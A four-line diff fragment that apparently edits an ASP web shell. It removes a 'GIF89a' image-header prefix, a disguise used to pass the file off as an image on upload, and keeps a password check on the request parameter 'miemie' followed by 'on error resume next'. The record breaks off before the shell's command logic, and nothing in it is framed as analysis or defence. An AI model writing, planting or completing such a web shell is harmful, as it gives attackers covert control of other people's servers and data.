@@ -1,4 +1,4 @@
-GIF89a$       ;<hTml>
+<hTml>
 <% if request("miemie")="av" then %>
 <%
 on error resume next
